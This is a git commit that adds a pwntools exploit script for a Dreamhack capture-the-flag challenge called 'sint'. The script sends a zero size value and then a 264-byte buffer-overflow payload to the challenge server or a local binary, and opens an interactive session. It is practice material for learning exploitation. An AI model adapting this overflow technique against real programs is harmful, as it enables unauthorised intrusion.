c4e8cb9b50fedc1593cef690f4c9723de579d483
HaiWH <168272290+haiwh07@users.noreply.github.com>
2026-09-14 15:43:44 +0700

    Add files via upload

---
+++ dreamhack/sint_chall/exp.py
@@ -0,0 +1,42 @@
+#!/usr/bin/env python3
+
+from pwn import *
+
+exe = ELF('sint', checksec=False)
+# libc = ELF('', checksec=False)
+context.binary = exe
+
+info = lambda msg: log.info(msg)
+s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
+sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
+sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
+sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
+sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
+sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
+sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
+slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
+def GDB():
+    if not args.REMOTE:
+        gdb.attach(p, gdbscript='''
+        b*main+68
+        c
+        b*main+137
+        
+        ''')
+        input()
+
+
+if args.REMOTE:
+    p = remote('host3.dreamhack.games', 22295)
+else:
+    p = process([exe.path])
+GDB()
+
+slna(b'Size: ', 0)
+payload = flat(
+    b'A'*256,
+    b'A'*8,
+    )
+sla(b'Data: ', payload)
+
+p.interactive()
